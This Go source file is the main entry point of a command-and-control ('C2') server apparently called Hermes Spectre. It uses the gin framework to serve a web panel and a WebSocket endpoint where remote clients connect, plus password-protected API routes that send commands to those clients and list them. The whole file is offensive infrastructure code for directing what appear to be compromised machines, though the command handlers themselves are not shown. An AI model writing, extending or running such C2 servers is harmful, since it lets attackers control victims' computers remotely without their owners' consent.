package main

import (
	"log"
	"net/http"

	"hermes_spectre/c2_server/api"
	"hermes_spectre/c2_server/config"
	"hermes_spectre/c2_server/internal/middleware"
	"hermes_spectre/c2_server/internal/services"

	"github.com/gin-gonic/gin"
)

func main() {
	// Load configuration
	cfg := config.DefaultConfig()

	// Create a new client manager
	var clientManager services.ClientManager
	clientManager = services.NewClientManager()

	// Set up the router
	router := gin.Default()

	// Apply middleware
	router.Use(middleware.Logger())

	// Serve static files for web interface
	router.StaticFS("/web", http.Dir("./web"))

	// Redirect root to web interface
	router.GET("/", func(c *gin.Context) {
		c.Redirect(http.StatusMovedPermanently, "/web/index.html")
	})

	// Public endpoints
	router.GET("/ws", api.WSHandler(clientManager))
	router.GET("/status", func(c *gin.Context) {
		c.JSON(200, gin.H{
			"status":  "online",
			"version": "1.0.0",
		})
	})

	// Protected API endpoints
	apiGroup := router.Group("/api")
	apiGroup.Use(middleware.BasicAuth())
	{
		apiGroup.POST("/command", func(c *gin.Context) {
			api.CommandHandler(clientManager)(c)
		})
		apiGroup.GET("/clients", func(c *gin.Context) {
			api.ClientsHandler(clientManager)(c)
		})
	}

	// Start the server
	log.Printf("C2 Server starting on %s", cfg.GetAddress())
	if err := router.Run(cfg.GetAddress()); err != nil {
		log.Fatalf("Failed to start server: %v", err)
	}

}
